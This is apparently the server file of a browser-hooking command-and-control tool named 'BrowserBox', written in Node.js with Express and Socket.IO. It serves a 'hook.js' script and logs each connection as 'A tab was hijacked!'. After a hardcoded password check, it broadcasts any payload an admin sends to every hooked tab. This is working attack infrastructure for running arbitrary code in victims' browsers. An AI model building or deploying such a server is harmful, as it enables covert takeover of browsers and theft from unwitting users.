const express = require('express');
const app = express();
const http = require('http');
const server = http.createServer(app);
const { Server } = require("socket.io");
const io = new Server(server);

/////////// Config ///////////
const Password = "Br0ws3rB0x";
const Port = 3000;
const Host = "localhost:3000";
//////////////////////////////

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/client/demo.html');
});

app.get('/hook.js', (req, res) => {
    res.sendFile(__dirname + '/client/hook.js');
});

io.on('connection', (socket) => {
    console.log('A tab was hijacked!');
    socket.on('password', (password) => {
        if(password == Password){
            console.log("BrowserBox Admin Online");
            socket.on('payload', (payload) => {
                console.log("New Payload!");
                io.emit('payload', payload);
            })
        }
    })
    socket.on('disconnect', () => {
      console.log('A tab was disconnected!');
    });
});

server.listen(Port, () => {
  console.log('BrowserBox listening on *:', Port);
});